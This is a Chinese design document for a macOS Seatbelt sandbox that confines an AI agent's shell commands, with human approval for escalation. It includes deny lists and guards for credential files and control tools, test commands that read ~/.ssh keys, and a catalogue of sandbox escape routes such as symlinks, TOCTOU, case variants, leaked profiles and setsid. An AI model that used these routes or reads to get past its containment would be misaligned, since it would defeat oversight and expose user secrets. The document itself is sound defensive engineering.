- **`unavailable`（没有审批通道）**：`shell-sandboxed` 拿不到 `approval` 时直接返回 `isError:true`，不发请求、不等待。**绝不"等一个永远不会来的答复"**。
- **卸载时的 pending**：现有 `denyAll()` 模式保留，新增两点：`denyAll()` 要覆盖 `kind:'escalation'`；同时清空 session 豁免表（否则热重载后旧豁免仍生效 = 权限漂移）。

### 3.6 为什么 escalation 不受 bypass 影响

`bypassApprovals` 的语义是"我懒，写文件别问我"；escalation 的语义是"**沙箱的内核边界刚被触碰了**"。前者是便利设置，后者是安全事件。把它们绑在同一个开关上，等于给 agent 一个"把安全事件降级成便利操作"的旋钮。

Codex 把这点做对了：`on-request` 下只有**超出沙箱边界**才提示，`never` 策略仍受沙箱约束。对应实现：`bypassApprovals` 只短路 `kind:'tool'`；`kind:'escalation'` 永远走人。

### 3.7 生命周期归属：Provider 拥有资源，Service 拥有登记，Fiber 拥有作用域

| 角色 | 拥有什么 | 为什么 |
|---|---|---|
| `SandboxProvider` | 真实 OS 资源：`sandbox-exec` 进程组、profile 内存、日志管道 | 只有它知道怎么释放 |
| `SandboxService` | 登记表 `handleId → { provider, abort, fiber }` + 全局兜底 | 需要跨插件看见"当前有哪些沙箱在飞"，才能防悬空 |
| 调用方 Fiber | 作用域：`ctx.effect` 里创建 run，disposer 里 abort | 卸载顺序由 effect 树保证，把"谁开的谁关"交给框架而不是靠人记得 |

三条规则：

1. **短生命周期（`execute`）**：`SandboxService.execute` 自己 `track/untrack`，`finally` 里 `destroy`；调用方 cancel 用 `signal`。没有"用完不关"的可能。
2. **长生命周期（`SandboxSession`，为未来常驻 jail/PTY 准备）**：只能由插件在自己的 `ctx.effect` 里创建并把 disposer 交回 Cordis；`SandboxService` 同时按 `fiber.uid` 登记，用于 Fiber 被强杀时兜底（disposer 异步且可能抛错，兜底是必要的）。
3. **禁止句柄外泄**：`execute` 的返回值里没有任何需要调用方手动释放的东西（没有 `ChildProcess`、没有 stream）。**无法泄漏，因为拿不到句柄**——这是防悬空沙箱的核心设计。

---

## 4. 接口伪代码

### 4.1 平台无关 IR 与 Provider

```ts
// packages/sandbox/src/types.ts —— 平台无关，Linux/Windows provider 共用
export interface PathGrant { path: string; recursive: boolean }   // false → (literal "...")
export type GuardMatch = 'exact' | 'subpath' | 'glob'

export interface PathGuard {
  id: string          // 'git-dir' | 'ssh-keys' | 'env-file' | 'launch-agents' | 'harness-state'
  path: string
  match: GuardMatch
  reason: string      // 给模型/用户看的解释，也是审批卡片文案
  owner?: string      // 由哪个插件贡献，用于精确回收与 UI 展示
}

export interface NetRule { host: string; port?: number; protocol?: 'tcp' | 'udp' }

/**
 * 平台无关的策略中间表示：只描述意图，不含 SBPL / seccomp / AppContainer 语法。
 */
export interface SandboxPolicy {
  id: string
  /** 内容版本：guard 增删、模式切换时 bump；provider 用它做编译缓存键 */
  version: number
  fs: {
    read: readonly PathGrant[]
    write: readonly PathGrant[]
    guardRead: readonly PathGuard[]    // 即使在 read 根内也拒绝读
    guardWrite: readonly PathGuard[]   // 即使在 write 根内也拒绝写
  }
  net: { mode: 'deny' | 'allowlist' | 'proxy'; allow: readonly NetRule[] }
  exec: { allowPaths: readonly string[] }
  /** 平台特有逃生舱：只有对应 provider 读；其他 provider 必须忽略并 warn 一次 */
  platform?: Readonly<Record<string, unknown>>
}

export type Exemption =
  | { kind: 'guard-read'; guard: string }
  | { kind: 'guard-write'; guard: string }
  | { kind: 'write-root'; path: string; once: true }

export interface SandboxSpec {
  runId: string
  command: string
  cwd: string
  policy: SandboxPolicy
  env?: NodeJS.ProcessEnv
  timeoutMs: number
  maxOutputBytes: number
  signal?: AbortSignal
  relax?: readonly Exemption[]       // 只影响本次编译出的 profile
  sessionId?: string
}

/** 统一日志里捞出来的原始拒绝，尚未分类 */
export interface RawDenialRecord {
  pid: number
  processName: string
  operation: string    // 'file-read-data' | 'network-outbound remote:*:443'
  target?: string
  at: number
}

export interface SandboxRunResult {
  runId: string
  exitCode: number | null       // 71 → sandbox-exec 自身在 execvp 阶段拒绝
  signal: NodeJS.Signals | null
  stdout: string
  stderr: string
  durationMs: number
  truncated: boolean
  denials: readonly RawDenialRecord[]   // provider 只提供证据，不做语义判断
  profileDigest?: string                // macOS：审计与"同一策略"判定
}

export interface SandboxHandle { id: string; providerId: string; kind: 'run' | 'session'; createdAt: number }

export type Capability =
  | 'kernel-fs' | 'kernel-net' | 'kernel-exec'   // 是否由内核强制
  | 'native-denial-log'                          // 是否有可靠归因通道
  | 'process-scoped'                             // 只约束子进程，还是约束整个进程
  | 'checked-in-process'                         // readFile/writeFile 只是检查+放行

/** 平台后端：**不是 Service**，通过 ctx.effect 注册进 ctx.sandbox 的 provider 表 */
export interface SandboxProvider {
  readonly platform: NodeJS.Platform
  readonly id: string                    // 'darwin-seatbelt' | 'linux-landlock' | 'win-appcontainer'
  readonly capabilities: ReadonlySet<Capability>
  readonly available: boolean            // 自检失败时为 false，SandboxService 不会交给调用方
  /** 平台元信息，UI/审计用。macOS: { sandboxExec, sbplVersion, profileDigest } */
  readonly extensions?: Readonly<Record<string, unknown>>

  /** 纯函数、可缓存：同一 (policy.version, relax) 只编译一次 */
  compile(policy: SandboxPolicy, relax?: readonly Exemption[]): Promise<PreparedPolicy>

  execute(spec: SandboxSpec, prepared: PreparedPolicy): Promise<SandboxRunResult>

  /** 进程内受控 IO（tool-fs 用）。macOS 上是"检查 + Node fs"，不是内核强制。 */
  readFile(path: string, opts: { encoding?: BufferEncoding }, handle: SandboxHandle): Promise<Buffer | string>
  writeFile(path: string, data: string | Uint8Array, opts: { mode?: number }, handle: SandboxHandle): Promise<void>

  /** 幂等：杀掉该 handle 名下所有进程组、断开日志管道、释放 profile 缓存 */
  destroy(handle: SandboxHandle): Promise<void>
  destroyAll(): Promise<void>
}

/** 平台特有，不进入公共接口：macOS 的编译产物 */
export interface PreparedPolicy {
  text: string                          // SBPL 文本，不落盘
  digest: string
  warnings: readonly string[]           // 未识别 operation、可疑空 allow
}
```

**macOS 特有 vs 必须通用**：

| 必须通用 | macOS 特有（藏在 darwin provider 内） |
|---|---|
| `SandboxPolicy` / `SandboxSpec` / `Exemption` / `SandboxRunResult` 字段 | SBPL 文本、`(version 1)`、`(deny default)` |
| `Capability` 枚举（表达"能不能"，不表达"怎么做"） | `sandbox-exec` 路径、`-f /dev/fd/3` 传参 |
| `readFile`/`writeFile`/`destroy` 语义 | `log stream --predicate 'sender == "Sandbox"'` 归因 |
| denial 的**原始** records 结构 | `file-read-data`、`network-outbound remote:*:443` 这些 operation 名 |
| 生命周期（谁拥有 session） | exit 71 的语义 |

### 4.2 SandboxService

```ts
export class SandboxService extends Service {
  static inject = { optional: ['settings'] }
  private providers = new Map<string, SandboxProvider>()
  private handles = new Map<string, { handle: SandboxHandle; abort: AbortController; fiber: Fiber }>()
  private draining = false

  constructor(ctx: Context) {
    super(ctx, 'sandbox')
    ctx.effect(() => () => {                    // 兜底：先摘能力，再回收资源
      this.draining = true
      for (const entry of this.handles.values()) entry.abort.abort()
      return Promise.all([...this.providers.values()].map(p => p.destroyAll()))
        .then(() => { this.handles.clear(); this.providers.clear() })
    }, 'sandbox.dispose')
  }

  /** 返回 disposer；sandbox-macos 在自己的 ctx.effect 里交出它 → provider 存活与插件存活严格同构 */
  registerProvider(provider: SandboxProvider): () => void {
    const previous = this.providers.get(provider.platform)
    this.providers.set(provider.platform, provider)
    return () => {
      if (previous) this.providers.set(provider.platform, previous)   // 先摘表
      else this.providers.delete(provider.platform)
      void provider.destroyAll()                                       // 再回收
    }
  }

  provider(platform = process.platform): SandboxProvider | undefined {
    if (this.draining) return undefined
    const provider = this.providers.get(platform)
    return provider?.available ? provider : undefined
  }

  /** 没有 provider 就抛错，而不是降级直连：fail-closed 第一道闸 */
  async execute(spec: SandboxSpec): Promise<SandboxRunResult> {
    const provider = this.provider()
    if (!provider) throw new SandboxUnavailableError(process.platform)
    const handle = this.track(provider, spec)
    try {
      const prepared = await provider.compile(spec.policy, spec.relax)
      return await provider.execute(spec, prepared)
    } finally {
      this.untrack(handle.id)
      await provider.destroy(handle)
    }
  }
}
```

### 4.3 DenialService

```ts
export type DenialKind =
  | 'fs-read-guarded' | 'fs-write-guarded' | 'fs-write-outside'
  | 'network-outbound' | 'process-exec' | 'process-control'
  | 'mach-lookup' | 'appleevent' | 'unknown'

export interface Denial {
  id: string
  runId: string
  sessionId?: string
  kind: DenialKind
  operation?: string        // SBPL 原文，审计用；不要用于业务判断
  target?: string
  guard?: string            // 命中守卫 id；审批卡片靠它说清"放宽哪一条"
  evidence: 'native-log' | 'stderr' | 'exit-code' | 'heuristic'
  confidence: 'high' | 'medium' | 'low'
  fingerprint: string       // sha1(kind + normalizedTarget + commandFamily)
  repeated: number
  command: string
  exitCode: number | null
  at: number
}

export class DenialService extends Service {
  static inject = { optional: ['sandbox'] }
  ingest(record: RawDenialRecord, run: RunContext): void       // 日志探针喂证据，不阻塞执行
  classify(result: SandboxRunResult, run: RunContext): Denial[]  // 执行结束后统一分类
  isRepeating(fingerprint: string): boolean
}
```

### 4.4 ApprovalService 扩展

```ts
export type ApprovalKind = 'tool' | 'escalation'

export interface EscalationContext {
  denial: Denial
  exemption: Exemption        // 只对本次重跑生效；不写盘、不进全局策略
  retry: 'safe' | 'unsafe'    // unsafe 时卡片必须警告"可能已部分执行"
  attempt: number
}

export class ApprovalService extends Service {
  /**
   * kind 缺省 'tool'（向后兼容）。
   * kind === 'escalation' 时：不受 bypassApprovals 影响；只能被 deny/allow/always 解析；
   * deadline 到期一律 deny 并 emit 'approval/timeout'。
   */
  async request(
    input: ApprovalRequestInput & { kind?: ApprovalKind; escalation?: EscalationContext },
    run: { signal?: AbortSignal } = {},
  ): Promise<ApprovalDecision>

  /** 插件可调参，但 onTimeout 的类型只有 'deny'，且不接受 Infinity */
  setDeadlinePolicy(policy: { timeoutMs: number; onTimeout: 'deny' }): () => void

  rules: { register(source: RuleSource): () => void }
}
```

---

## 5. 失败模式与缓解

### 5.1 常规沙箱失败模式

| 失败模式 | 具体表现（macOS） | 缓解 |
|---|---|---|
| **符号链接逃逸** | 进程内守卫用字符串比较，`<ws>/link → ~/.ssh` 能读到 | ① 比较前 `realpath`；② 内核层实测按 vnode 判定（`cat <ws>/link` 指向 `/etc/hosts` 时被拒），bash 路径天然安全；③ `provider.writeFile` 前 `lstat` 检查 |
| **TOCTOU** | 检查完 `<ws>/x` 后，另一路把 `x` 换成指向 `~/.ssh` 的软链 | 进程内检查不能消除，只能缩短窗口。真正的修法是"操作也走 provider"（`writeFile` 内部再检查一次）或 jail 模式下由内核裁决。**必须承认：单靠进程内检查不是安全边界** |
| **SBPL 纵深不足** | `(allow file-read*)` 一把梭；或忘了 `(deny default)` 导致默认放行 | `compile()` 纯函数 + snapshot 测试；启动自检：用生成的 profile 跑一组"应被拒"探针（读 `~/.ssh/config`、连 loopback、写 `.git/config`），任一条**没被拒**就 `logger.error` 并把 provider 标记 `available:false`（fail-closed） |
| **deny/allow 顺序误解** | 以为"后写的 allow 能覆盖前面的 deny"，把 exemption 实现成追加 allow → 放宽静默失效 | 实测结论写进代码注释与测试（A3/A4）；exemption 实现为"删 deny 语句" |
| **网络拒绝无痕** | curl exit 7、nc exit 1、stderr 空 → 与"服务没起"无法区分 | `sandbox-native-log` 旁路；旁路不可用时 `confidence:'low'`，只允许"问人"，不许"自动判为沙箱拒绝后放宽" |
| **日志噪音误归因** | 统一日志里有 `logd_helper`、`ecosystemd` 的 deny（实测 A11），被当成 agent 的 | 按 pid 家族（run 期间记录的 pid 集合）+ 时间窗过滤，并校验 `processName ∈ {命令首 token, sh, 子进程名}` |
| **审批无超时 / 无应答** | WebSocket 断了，请求永远 PENDING，turn 挂死 | §3.5：内核 deadline + `unavailable` 立即失败；卸载 `denyAll()` |
| **case-insensitive / Unicode 绕过** | `.Git`、NFD 形式的 `.git` 绕过字符串守卫 | 守卫比较统一 `realpath + NFC + 大小写折叠`；测试矩阵放三种变体（D3） |
| **profile 泄漏边界** | profile 落 `/tmp` 或进 `ps`，agent 读到后精确绕开 | fd 3 传参（实测 A13）；`ps` 里只有 `-f /dev/fd/3` |
| **`sandbox-exec` 被弃用** | Apple 长期不推荐 `sandbox-exec`，未来版本可能移除 | provider 抽象 + `capabilities` 探测；备选：App Sandbox entitlement + XPC 辅助进程、`launchd` + 受限账户。风险写进 README，不假装不存在 |

### 5.2 Cordis 特有风险一：热卸载时沙箱资源未清理

**不处理会发生什么**：

- 热重载 `sandbox-macos` → provider 从表里消失，但已在跑的 `sandbox-exec` 还在；输出管道指向已销毁的 handler，`stdout` 无人读 → 管道写满 → 子进程阻塞在 `write()`，成为**僵尸 CPU 消费者**。
- `detached: true` 意味着它不属于 Node 进程组，Node 退出也不带走 → 孤儿继续以用户权限运行，且仍受**旧 profile** 约束（旧 profile 可能是宽松的那一版）。最坏情况：**卸载反而放宽了边界**。
- profile 缓存若是模块级单例，会残留旧版 profile 供下次复用。

**保证 `fiber.dispose()` 不留孤儿**，四条：

```ts
// 1) run 的清理挂在 effect 上，disposer 是 async 的（Cordis 的 _unload 会 await）
ctx.effect(() => {
  const controller = new AbortController()
  const children = new Set<ChildProcess>()
  runs.set(runId, { controller, children })
  return async () => {
    controller.abort()                                  // 让 await execute() 的人立刻拿到错误
    for (const child of children) killGroup(child)       // SIGTERM → 500ms → SIGKILL(-pgid)
    await Promise.all([...children].map(waitExit))       // 等 close，避免"已 dispose 但进程还在"
    children.clear(); runs.delete(runId)
  }
}, 'shell.run')

// 2) kill 打进程组，不只打 sandbox-exec 本身
function killGroup(child: ChildProcess) {
  try { process.kill(-child.pid!, 'SIGTERM') } catch {}
  const hard = setTimeout(() => { try { process.kill(-child.pid!, 'SIGKILL') } catch {} }, 500)
  child.once('close', () => clearTimeout(hard))
}

// 3) provider 卸载：先摘表再 destroy（§4.2），保证新 execute 立刻失败而不是打半死的 provider
// 4) 服务兜底：ctx.sandbox 的 effect disposer abort 全部 run 并 await provider.destroyAll()
```

**仍然会漏的一类**：命令自己 `setsid` / double-fork 逃出进程组。缓解按强度：

1. `(deny process-fork)` ⚠️ —— 太严，`sh` 起子进程都会挂，不可用。
2. `exec.allowPaths` 不含 `/usr/bin/setsid`，并对 `nohup` 保留 danger 规则 —— 覆盖一部分。
3. **唯一可靠的**：独立进程组 + `kill(-pgid)`，并明确"后台进程不支持"（`&`、`nohup` 属于 danger 规则，需审批）。
4. 会话级清扫：所有 run 的 pgid 记进 `.ruobai/sandbox-runs.jsonl`；下次启动 `sandbox` 插件做孤儿清扫（仅当 pgid 存活且 cmdline 含 `sandbox-exec -f /dev/fd/3` 才 kill，避免误杀）。

**结论要写进文档**：我们不承诺回收 agent 主动 daemon 化的进程，只承诺回收我们 spawn 的进程树。

### 5.3 Cordis 特有风险二：双向 inject 的依赖循环

**Cordis 的行为**：`inject` 的依赖没就绪 → Fiber 停在 `PENDING`（`fiber.ts` 的 `_updateState` 返回 `FiberState.PENDING`），**没有环检测、没有超时**。所以 `sandbox` inject `approval`、`approval` inject `denial`、`denial` inject `sandbox` 的结果是：三个插件全部 PENDING，`cordis.yml` 里看着都在，UI 什么都不工作，**日志里没有任何报错**。这是最难排查的一类故障。

拆法（本设计已内置）：

```
sandbox    → （不 inject 任何东西）
policy     → sandbox
guards     → policy
denial     → （optional sandbox；只需要"执行结果"，可独立跑）
log-probe  → denial
escalation → approval, denial
shell-sbx  → shell, sandbox, policy, denial   [optional approval, escalation]
```

关键：**approval 的依赖图上不出现 sandbox**，反之亦然。审批只认识"请求"和"规则"；沙箱只认识"策略"和"拒绝记录"。

将来若真的需要"审批知道沙箱状态"（比如 UI 显示当前 profile），走**可选依赖 + 事件**，不走 required inject：

```ts
export const inject = { required: ['approval'], optional: ['sandbox'] }
// apply 里 ctx.on('sandbox/policy-changed', ...) —— 事件订阅本身也是 effect，可回收
```

补一条工程约束进 CI：**装载 `cordis.yml` 后 5 秒内任何 Fiber 不得停留在 PENDING**，否则启动失败（D11）。这比"祈祷没人写出环"可靠。

### 5.4 Cordis 特有风险三：策略在热重载后的状态漂移

三层状态，处理方式完全不同——**混在一起就是 bug 源头**：

| 状态 | 例子 | 生命周期 | 正确做法 |
|---|---|---|---|
| **磁盘权威状态** | `~/.ruobai/settings.json` 的 `approval.rules`、`<ws>/.ruobai/sandbox.json` | 永久，与插件无关 | **不随卸载消失**（用户资产），重载后重新读盘 |
| **内存派生状态** | 编译好的 SBPL、规则求值缓存、denial 指纹、session 豁免 | 必须与 Fiber 同生共死 | 全部放进 `ctx.effect` 作用域；`bump(version)` 让缓存失效 |
| **临时授权** | 用户点 "always" 给的会话豁免 | 会话级，**绝不写盘** | 内存 Map + TTL；`sandbox`/`approval` 卸载时清空 |

防漂移机制：

1. **版本号 + 不可变快照**：规则源 `version()` 变化时 `bump()`；求值器每次从 `sources` 重拼快照（`Object.freeze`），**不缓存"最后结果"**，只缓存"某版本下的结果"，键含版本，卸载整体丢弃。
2. **disposer 必须真的删数据**，不能只退订：

```ts
ctx.effect(() => {
  sources.set(id, source); bump()
  return () => {
    sources.delete(id)          // ← 少了这行就是典型的"卸载后规则还在"
    bump()
  }
}, `approval.rules.${id}`)
```

3. **指纹表带 generation**：denial 服务重载时 `generation++`，旧条目 generation 不匹配即视为不存在。即使某次清理有漏，新会话也不会"继承"旧计数（否则会出现"第一次就判定重复、直接拒绝升级"的怪现象）。
4. **测试**：D10 专测热重载——加载 → 触发 denial → 卸载规则源插件 → 再触发 → 断言"规则不再生效且指纹从 0 开始"。

---

## 6. 演进路径

### M0（1 天）：把执行面收敛到一个接口

- 抽出 `@ruobai/shell`（`ctx.shell`）与 `ShellExecutor` 接口，`tool-bash` 改为 `inject ['tools','shell']`。
- 加 `@ruobai/shell-direct`（直连，等价现状），`cordis.yml` 显式挂载。
- 产出：**"用不用沙箱"变成 `cordis.yml` 的一行删改**，代码里零分支。安全性未变，但结构就位。
- 验收：现有 `tests/tool-bash` 全绿；`pnpm typecheck` 通过。

### M1（最小可行组合，3–5 天）：隔离 + 归因

只上 5 个插件：`sandbox`、`sandbox-policy`、`sandbox-guards`、`sandbox-macos`、`shell-sandboxed`（denial 可先内联极简实现，M2 拆出）。

- SBPL：`(deny default)` + read/write 白名单 + `.git`/`.ssh`/`.env` guard + `(deny network*)`。
- `shell-sandboxed` 只做"执行 + 把 `Operation not permitted` 结构化返回"，**不做升级**（denial 一律回给模型并附"不要重试"）。
- 启动自检探针必须过，否则 provider 不注册。
- 验收（可机器验证）：`cat ~/.ssh/config` 拒绝且结果含 `kind: fs-read-guarded`；`echo x >> .git/config` 拒绝；`curl http://127.0.0.1:4310/` 拒绝（分类为 `network-outbound` 需要 native-log，否则 `unknown`）；`echo hi > notes.txt` 成功；**真实项目的 `npm test` 成功**（这一步最能暴露 read 根缺失）。

### M2（升级闭环，3–5 天）：denial → 审批 → 单次放宽

- 拆出 `sandbox-denial` + `sandbox-native-log`。
- 扩 `ApprovalService`：`kind`、deadline、`setDeadlinePolicy`。
- `sandbox-escalation`：可放宽性映射、重跑安全分类、指纹抑制。
- `shell-sandboxed` 完整链路（§3.2）。
- 验收：`cat ~/.ssh/id_rsa` → 卡片（含 guard id 与 target）→ allow → 重跑成功且 profile digest 变化、日志含 `attempt=2`；deny → 模型收到"不要重试"；连续两次 → 第二次不弹窗。

### M3（策略分层与可运维，1 周）

- 规则来源插件 `approval-rules-{managed,project,user,session}` + `deny→ask→allow` 求值。
- `sandbox-policy` 支持项目级 `.ruobai/sandbox.json`（额外 write 根、额外 guard），首次信任提示。
- `sandbox-web`：展示 IR 摘要（不展示 SBPL）、guard 列表、denial 时间线、"本会话放宽过什么"，以及全局「沙箱保护」开关。开关写 `settings.sandbox.enabled`；关闭后 `shell-sandboxed` 每次运行时委托给 `direct` 执行器（没有直连执行器就 fail-closed），审批与危险命令保护不受影响。策略本体（guards / network / write 根）仍然不通过 HTTP 编辑。
- 验收：D10（热重载规则源）。

### M4（生产级，2–3 周）

- `@ruobai/sandbox-net-proxy`：`net.mode='proxy'`，`(deny network*)` + 只允许连代理端口；代理做域名白名单 + 审计。**默认仍关闭**。
- 进程级 jail：`bin/rbu-jail` + `deploy/harness-jail.sb` + `jail` 配置块（非插件）。
- 孤儿清扫、`sandbox-runs.jsonl` 审计、崩溃恢复。
- 性能：profile 缓存；测量 `sandbox-exec` 启动开销（每次几十 ms），必要时换"常驻 helper + XPC"——这会替换 provider 而不改接口，正好验证抽象。
- Linux provider（Landlock + seccomp + netns）：**若 Linux 实现需要改 `SandboxPolicy` 字段，说明 M1 的抽象有漏**。这是抽象的验收测试。

---

## 附录 A：本机实测记录（macOS 26.6.2 / 25G83）

| # | 命令 | 结果 | 对设计的含义 |
|---|---|---|---|
| A1 | `sandbox-exec -p '(version 1)(deny default)(allow file-read*)' /bin/ls /` | `sandbox-exec: execvp() of '/bin/ls' failed: Operation not permitted`，exit **71** | exec 阶段拒绝有独立签名（exit 71 + `execvp()`），比 syscall 阶段好归因 |
| A2 | `(deny default)(allow file-read*)(deny file-read* (subpath "/etc"))` + `cat /etc/hosts` | `cat: /etc/hosts: Operation not permitted`，exit 1 | 子进程 stderr **只有 EPERM**，无 operation/path |
| A3 | 同 A2，但 `deny` 写在 `allow` **之前** | 同样被拒 | **deny 优先，与顺序无关** |
| A4 | `(allow file-read* (literal "/etc/hosts"))` + `(deny file-read* (subpath "/etc"))`，两种顺序 | 都被拒 | **allow 更具体也不能翻盘 deny** → exemption 必须删 deny |
| A5 | `(allow default)(deny file-write* (subpath ".../.git"))` + `touch .git/config` | 拒绝 | Codex 式"根内只读覆盖"可用 |
| A6 | 软链 `<ws>/link → /etc/hosts`，deny `/etc` | 拒绝 | Seatbelt 按 **vnode** 判定，symlink 不是逃逸路径 |
| A7 | `(allow default)(deny network*)` + `curl http://127.0.0.1:4310/` | exit **7**，stderr 空 | 网络拒绝在子进程侧**完全无痕** |
| A8 | 同上 + `nc -z 1.1.1.1 443` | exit 1，静默 | 同上 |
| A9 | `log show --last 30s --predicate 'sender == "Sandbox"'` | `kernel: (Sandbox) Sandbox: curl(11787) deny(1) network-outbound remote:*:80`，**普通用户可读** | 归因通道成立 |
| A10 | `log stream --predicate 'sender == "Sandbox"'` 实时订阅 | 1–2s 内拿到 curl 的 deny 行 | 可作旁路探针，需按 pid 过滤 |
| A11 | A9 的全量输出 | 混有 `logd_helper`、`ecosystemd` 的 deny | **必须过滤 pid/进程名**，否则误归因 |
| A12 | `(deny default (with report))` | `sandbox-exec: report modifier does not apply to deny action` | 不能靠 profile 提高日志级别 |
| A13 | `printf '<profile>' \| sandbox-exec -f /dev/fd/3 cat /etc/hosts 3<&0` | 正常加载并拒绝 | **profile 可不落盘** |
| A14 | 语法探针：`(deny network*)`、`(deny process-info*)`、`(deny signal (target others))`、`(deny appleevent-send)`、`(regex #"/\.env$")`、`(allow ipc-posix-shm)`、`(allow mach-lookup (global-name ...))` | 全部被接受（`/bin/echo ok` 正常） | 附录 C 模板可直接用 |

| A15 | `(deny process-info*)` + `curl -s -m 2 http://127.0.0.1:1/` | **SIGTRAP**：日志显示 `deny(1) process-info-pidinfo self`，curl 在 `getpid()` 之后自陷 | **不能禁用 process-info**：默认 `allow`，进程控制遏制改由 `(deny signal (target others))` + `(deny appleevent-send)` 承担 |
| A16 | 同一 profile 同时 deny `/var/.../<ws>/.git`，实际文件在 `/private/var/...` | 写入**未被拒**（`exit 0`） | **Seatbelt 按解析后的 vnode 路径匹配**，profile 里所有路径必须 `realpath`（`/var` → `/private/var`），否则守卫静默失效。不存在的目标要解析最近的已存在祖先再拼回 |
| A17 | `(deny default)` + 白名单读 `/usr`、`/System`、`/private/etc`，无 `(literal "/")` | `curl` **SIGABRT**，日志 `deny(1) file-read-data /`；补 `(allow file-read* (literal "/"))` 后恢复（exit 7） | 必须放行根 vnode 本身；但**绝不能写成 `(subpath "/")`**，那等于放行整盘读 |
## 附录 B：`cordis.yml` 片段（已落地，与仓库中的文件一致）

```yaml
- id: shell
  name: '@ruobai/shell'

- id: sandbox
  name: '@ruobai/sandbox'

- id: sandbox-policy
  name: '@ruobai/sandbox-policy'
  config:
    root: !!js "process.cwd()"
    network:
      mode: deny                 # deny | allowlist | proxy —— 默认值在 schema 里
      allow: []
    limits:
      timeoutMs: 120000
      maxOutputBytes: 32768

- id: sandbox-guards
  name: '@ruobai/sandbox-guards'
  config:
    includeDefaults: true        # .git / .ssh / .aws / .env / .ruobai/ / LaunchAgents
    # 项目级追加走 .ruobai/sandbox.json（M3）

- id: sandbox-macos
  name: '@ruobai/sandbox-macos'
  config:
    selfCheck: true              # 探针不过 → provider 保持 available:false
    machLookup: allow            # 见 A15/§7.2：默认必须放行，否则工具链崩
    processInfo: allow           # 见 A15：deny 会让 curl SIGTRAP
    # deniedExecutables 默认含 /usr/bin/security、osascript、launchctl、crontab、setsid、nohup

- id: sandbox-denial
  name: '@ruobai/sandbox-denial'
  config:
    repeatWindowMs: 300000
    repeatThreshold: 2

- id: sandbox-native-log
  name: '@ruobai/sandbox-native-log'
  config:
    predicate: 'sender == "Sandbox"'

- id: shell-sandboxed
  name: '@ruobai/shell-sandboxed'
  config:
    escalate: auto               # auto | never

- id: approval-deadline
  name: '@ruobai/approval-deadline'
  config:
    timeoutMs: 180000            # 仅调参；onTimeout 恒为 deny

- id: sandbox-escalation
  name: '@ruobai/sandbox-escalation'
  config:
    relaxable: [fs-read-guarded, fs-write-guarded, fs-write-outside]
    neverRelaxable: [network-outbound, process-control, mach-lookup, appleevent]
    retrySafeCommands: [cat, ls, head, tail, wc, grep, git, node]
```

要退出沙箱（等价改造前行为）：删 `shell-sandboxed`，加

```yaml
- id: shell-direct
  name: '@ruobai/shell-direct'
  config:
    shell: /bin/sh
```

`shell-direct` 不注册时，`tool-bash` 会以 `ShellUnavailableError` 失败——它本身不再 spawn 任何进程。

## 附录 C：SBPL 模板（`compileProfile()` 的真实输出，已通过 13 条快照断言）

```sbpl
(version 1)
(deny default)

;; platform baseline
(allow file-read* (literal "/"))
(allow file-read* (subpath "/usr"))
(allow file-read* (subpath "/bin"))
(allow file-read* (subpath "/sbin"))
(allow file-read* (subpath "/System"))
(allow file-read* (subpath "/Library/Apple"))
(allow file-read* (subpath "/Library/Developer"))
(allow file-read* (subpath "/private/var/db/dyld"))
(allow file-read* (subpath "/private/etc/ssl"))
(allow file-read* (subpath "/private/etc/resolv.conf"))
(allow file-read* (subpath "/private/etc/hosts"))
(allow file-read* (subpath "/private/etc/passwd"))
(allow file-read* (subpath "/private/etc/protocols"))
(allow file-read* (subpath "/private/etc/services"))
(allow file-read* (subpath "/dev"))
(allow file-read-metadata)
(allow sysctl-read)
(allow ipc-posix-shm)
(allow mach-lookup)
(allow process-info*)
(allow process-exec* (subpath "/usr/bin"))
(allow process-exec* (subpath "/bin"))
(allow process-exec* (subpath "/usr/sbin"))
(allow process-exec* (subpath "/sbin"))
(allow process-exec* (subpath "/usr/local/bin"))
(allow process-exec* (subpath "/opt/homebrew/bin"))

;; read grants
(allow file-read* (subpath "/Users/x/ws") (subpath "/Users/x"))

;; write grants
(allow file-write* (subpath "/Users/x/ws") (subpath "/var/folders/xy/T"))
(allow file-write* (literal "/dev/null") (literal "/dev/stdout") (literal "/dev/stderr") (literal "/dev/fd") (literal "/dev/tty"))

;; guards (deny always outranks allow, in any order)
(deny file-read* (regex #"^/Users/x/ws/\.env[^/]*$") (regex #"^/Users/x/ws/.*/\.env[^/]*$") (subpath "/Users/x/.ssh") (subpath "/Users/x/.aws") (subpath "/Users/x/.config/gh") (subpath "/Users/x/.docker") (literal "/Users/x/.netrc"))
(deny file-write* (subpath "/Users/x/ws/.git") (subpath "/Users/x/ws/.ruobai") (literal "/Users/x/.zshrc") (literal "/Users/x/.bash_profile") (literal "/Users/x/.profile") (subpath "/Users/x/Library/LaunchAgents") (subpath "/Users/x/Library/Application Support/Ruobai"))

;; network
(deny network*)

;; control plane
(deny appleevent-send)
(deny signal (target others))
(deny process-exec (literal "/usr/bin/security"))
(deny process-exec (literal "/usr/bin/osascript"))
(deny process-exec (literal "/usr/bin/sudo"))
(deny process-exec (literal "/usr/bin/su"))
(deny process-exec (literal "/usr/bin/launchctl"))
(deny process-exec (literal "/usr/bin/crontab"))
(deny process-exec (literal "/usr/bin/setsid"))
(deny process-exec (literal "/usr/bin/nohup"))
(deny file-write* (subpath "/private/etc") (subpath "/System") (subpath "/Library"))
```

`compile()` 里三条断言（违反即抛，不许"临时放宽调试"）：`(deny default)` 必须存在；出现 `(allow default)` 直接抛；每个未豁免 guard 的 filter 必须出现在输出里（防"配了但没编进去"的静默失效）。另加两条回归断言：**不得出现 `(subpath "/")`**（A17）、**每条 guard 的路径必须是 realpath 后的形式**（A16）。

## 附录 D：测试矩阵

| # | 类型 | 用例 | 断言 |
|---|---|---|---|
| D1 | 单元 | `compile(policy)` snapshot | 含 `(deny default)`；无 `(allow default)`；guard 数 = deny 语句数 |
| D2 | 单元 | `compile(policy, [exemption])` | 命中那条 deny 消失，其余逐字节不变；digest 改变 |
| D3 | 单元 | 守卫匹配：`.Git` / NFD `.env` / 软链 | 三种变体都命中 |
| D4 | 集成 | `cat ~/.ssh/id_*`、`echo > .git/config`、`curl 127.0.0.1` | 都被拒且分类正确（网络类需 log 探针，缺探针时 `confidence:'low'`） |
| D5 | 集成 | 真实小项目 `npm test` | 成功（证明 profile 不过度收紧） |
| D6 | 集成 | escalation：deny → allow → 重跑 | 第二次 digest 不同；`attempt=2`；日志含 exemption id |
| D7 | 集成 | 重复 denial | 第二次不弹窗，返回"不要重试" |
